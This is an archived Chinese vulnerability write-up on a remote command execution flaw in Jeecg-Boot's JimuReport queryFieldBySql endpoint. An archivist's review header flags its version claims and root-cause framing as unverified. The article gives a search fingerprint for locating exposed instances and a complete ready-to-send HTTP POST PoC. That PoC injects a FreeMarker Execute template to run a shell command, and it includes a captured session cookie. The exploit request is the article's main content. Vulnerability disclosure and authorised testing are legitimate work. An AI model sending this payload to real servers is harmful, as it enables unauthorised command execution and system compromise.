---
source: "gelusus/wxvl 公众号漏洞文库"
product: "JimuReport/queryFieldBySql FreeMarker，宿主JeecgBoot"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Jeecg-Boot 远程命令执行漏洞 附POC"
prerequisites: "来源所述条件，未列明部分仍待核：声称JeecgBoot3.0.0至3.5.3及2.4.x至2.4.6，未列实际JimuReport依赖或固定点"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8b84f97d308fef2b0704ff0f"
entity_id: "ve-8b84f97d308fef2b0704ff0f"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：声称JeecgBoot3.0.0至3.5.3及2.4.x至2.4.6，未列实际JimuReport依赖或固定点

代码与实验材料：Execute模板置SQL字符串，带历史JSESSIONID；无认证对照与文字输出，模板resolver配置未列

来源证据范围：北风微信2026-02-05，缺官方公告/PoC原始研究

- **事实待核（1）**：旧漏洞缺编号且宿主范围无依据；依据：queryFieldBySql/FreeMarker机制与182一致，标题日期可能让人误认新漏洞；最新版本修复无固定点。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **凭据与会话边界（2）**：模板注入与SQL注入需区分；依据：根因表述SQL未过滤，实际载荷是模板执行；冗余浏览器头、cookie不应当必要条件。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  Jeecg-Boot 远程命令执行漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-05 02:57  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
# Jeecg-Boot 远程命令执行漏洞  
  
  
02  
  
—  
  
影响版本  
  
Jeecg-Boot版本3.0.0至3.5.3或者Jeecg-Boot版本2.4.x至2.4.6  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3u7tXAgE9T6Ass23YqH3VOIbYg0cuibI1niathvVa4KrVVALzHuo2oPzOw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
Jeecg-Boot是一款企业级低代码开发平台，集成了AI应用功能，旨在帮助开发者快速实现低代码开发和构建个性化AI应用。该平台采用前后端分离架构，基于SpringBoot、SpringCloud、Vue3等主流技术栈，具备强大的代码生成器，可一键生成前后端代码，显著减少重复性工作，提高开发效率。Jeecg-Boot远  
程命令执行漏洞源于接口对用户输入的SQL语句未进行严格过滤和验证，攻击者可通  
过构造恶意SQL语  
句，利用Freemarker模板引擎的特性，将恶意代码注入到模板中执行  
，从而实现远程命令执行。  
  
04  
  
—  
  
资产测绘  
```
"Jeecg-Boot 企业级快速开发平台"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3utbxzIs6Rx2Fn8akWkAicNZsa6VoBOFPqrHh0apuyyBNusnCfk8eLxRg/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 127.0.0.1
Connection: close
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=gNyJ0QkLIu1GswcpojLsUJVJD2h-kC_u20kPE6FC
Content-Type: application/json
Content-Length: 94

{"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3uia1zzb12CwAnqSs27BfNEyPS2ZxXhlzbqmsHrFdteiaXSiaZ2SyoniaFlg/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
